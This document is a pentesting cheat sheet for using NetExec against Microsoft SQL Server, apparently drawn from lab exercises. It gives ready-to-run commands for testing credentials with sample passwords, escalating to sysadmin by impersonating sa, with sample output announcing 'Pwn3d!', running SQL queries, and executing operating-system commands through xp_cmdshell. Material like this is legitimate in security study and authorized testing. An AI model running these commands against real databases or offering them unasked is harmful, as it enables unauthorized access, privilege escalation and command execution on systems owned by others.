# Netexec: 

## Credential Test: 

- nxc mssql 172.21.0.0 -u afsimmons -p '0neP@assw0rd1!'
- nxc mssql 172.21.0.0 -u afsimmons -p '0neP@assw0rd1!' -d megacorpone.com
- nxc mssql 172.21.0.0 -u afsimmons -p '0neP@assw0rd1!' --local-auth

## Specifying ports: 

- nxc mssql 172.21.0.0 -u afsimmons -p '0neP@assw0rd1!' --port 1434

# Check for impersonation abilities: 

- nxc mssql 172.21.0.0 -u afsimmons -p 0neP@assw0rd1!'

```
NetExec mssql <ip> -u afsimmons -p password -M mssql_priv -o ACTION=privesc
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\afsimmons:password 
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\afsimmons can impersonate: sa (sysadmin)
MSSQL_PRIV  <ip>   1433   FQDN      [+] FQDN\afsimmons is now a sysadmin! (Pwn3d!)
```

# WARNING: Remember to rollback sysadmin privs in Production!

```
NetExec mssql <ip> -u user -p password -M mssql_priv -o ACTION=rollback
MSSQL       <ip>   1433   FQDN      [*] Windows 10 / Server 2019 Build 17763 (name:FQDN) (domain:FQDN.local)
MSSQL       <ip>   1433   FQDN      [+] FQDN\user:password (Pwn3d!)
MSSQL_PRIV  <ip>   1433   FQDN      [+] sysadmin role removed
```

# Executing MSSQL Commands: 
```
nxc mssql 10.10.10.52 -u admin -p 'm$$ql_S@_P@ssW0rd!' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
```

## Execute XP_CMDSHELL

- nxc mssql 172.21.0.0 -u sa -p 'GWE3V65#6KFH93@4GWTG2G' --local-auth -x whoami
# Resources 

- https://www.netexec.wiki/mssql-protocol/authentication
- https://www.netexec.wiki/mssql-protocol/mssql-privesc
- https://www.netexec.wiki/mssql-protocol/mssql-command
- https://github.com/quentinhardy/msdat